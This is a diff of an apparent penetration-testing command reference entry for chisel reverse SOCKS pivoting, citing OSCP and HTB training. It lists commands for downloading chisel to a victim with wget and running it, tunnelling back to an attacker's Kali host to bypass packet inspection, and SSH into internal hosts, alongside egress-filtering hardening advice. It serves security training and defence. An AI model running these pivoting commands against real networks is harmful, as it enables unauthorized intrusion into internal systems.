@@ -45,31 +45,31 @@
       "command": "./chisel client -v 10.10.14.17:1234 R:socks"
     },
     {
-      "label": "OSCP Ch19 \u2014 serve chisel binary via Apache on Kali",
+      "label": "OSCP Ch19 — serve chisel binary via Apache on Kali",
       "command": "sudo cp $(which chisel) /var/www/html/\nsudo systemctl start apache2"
     },
     {
-      "label": "OSCP Ch19 \u2014 download chisel to victim and make executable",
+      "label": "OSCP Ch19 — download chisel to victim and make executable",
       "command": "wget <kali_ip>/chisel -O /tmp/chisel && chmod +x /tmp/chisel"
     },
     {
-      "label": "OSCP Ch19 \u2014 reverse server on Kali (port 8080, --reverse creates SOCKS on 127.0.0.1:1080)",
+      "label": "OSCP Ch19 — reverse server on Kali (port 8080, --reverse creates SOCKS on 127.0.0.1:1080)",
       "command": "chisel server --port 8080 --reverse"
     },
     {
-      "label": "OSCP Ch19 \u2014 reverse SOCKS client on pivot (R:socks = SOCKS5 listener on Kali 1080)",
+      "label": "OSCP Ch19 — reverse SOCKS client on pivot (R:socks = SOCKS5 listener on Kali 1080)",
       "command": "/tmp/chisel client <kali_ip>:8080 R:socks"
     },
     {
-      "label": "OSCP Ch19 \u2014 verify chisel SOCKS listener appeared on Kali",
+      "label": "OSCP Ch19 — verify chisel SOCKS listener appeared on Kali",
       "command": "ss -ntplu | grep 1080"
     },
     {
-      "label": "OSCP Ch19 \u2014 SSH through chisel SOCKS via ncat ProxyCommand",
+      "label": "OSCP Ch19 — SSH through chisel SOCKS via ncat ProxyCommand",
       "command": "ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <user>@<internal_ip>"
     }
   ],
-  "notes": "Add 'socks5 127.0.0.1 1080' to /etc/proxychains.conf, then run tools with proxychains. Reverse mode helps when the pivot cannot accept inbound connections. Also covered in: OSCP PEN-200 Chapter 19 (Tunneling Through Deep Packet Inspection). OSCP Ch19: chisel wraps traffic in HTTP to bypass DPI \u2014 key when SSH and raw TCP are filtered but HTTP/HTTPS outbound is allowed. Reverse mode (--reverse on server, R:socks on client): client connects OUT from the pivot to Kali, and Kali exposes a SOCKS5 proxy on 127.0.0.1:1080. No --socks5 flag needed on the server in reverse mode \u2014 R:socks on the client is sufficient. After tunnel is up, use ncat ProxyCommand to SSH directly to internal hosts through the SOCKS5 proxy without separate proxychains config.",
+  "notes": "Add 'socks5 127.0.0.1 1080' to /etc/proxychains.conf, then run tools with proxychains. Reverse mode helps when the pivot cannot accept inbound connections. Also covered in: OSCP PEN-200 Chapter 19 (Tunneling Through Deep Packet Inspection). OSCP Ch19: chisel wraps traffic in HTTP to bypass DPI — key when SSH and raw TCP are filtered but HTTP/HTTPS outbound is allowed. Reverse mode (--reverse on server, R:socks on client): client connects OUT from the pivot to Kali, and Kali exposes a SOCKS5 proxy on 127.0.0.1:1080. No --socks5 flag needed on the server in reverse mode — R:socks on the client is sufficient. After tunnel is up, use ncat ProxyCommand to SSH directly to internal hosts through the SOCKS5 proxy without separate proxychains config.",
   "references": [
     {
       "title": "HTB Academy - Pivoting, Tunneling, and Port Forwarding",
@@ -92,10 +92,6 @@
     }
   ],
   "variations": [
-    {
-      "label": "Forward - Server (pivot)",
-      "command": "./chisel server -v -p <port> --socks5"
-    },
     {
       "label": "Forward - Client (attacker)",
       "command": "./chisel client -v <pivot_ip>:<port> socks"
@@ -152,8 +148,9 @@
       "HTB M12",
       "MITRE T1090.001"
     ],
-    "misconfiguration": "The network lacks proper segmentation \u2014 a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.",
-    "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy \u2014 direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
-    "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering \u2014 block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring \u2014 detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection \u2014 detect reverse tunnels in HTTPS streams"
-  }
+    "misconfiguration": "The network lacks proper segmentation — a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.",
+    "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy — direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
+    "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering — block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring — detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection — detect reverse tunnels in HTTPS streams"
+  },
+  "type": "command"
 }
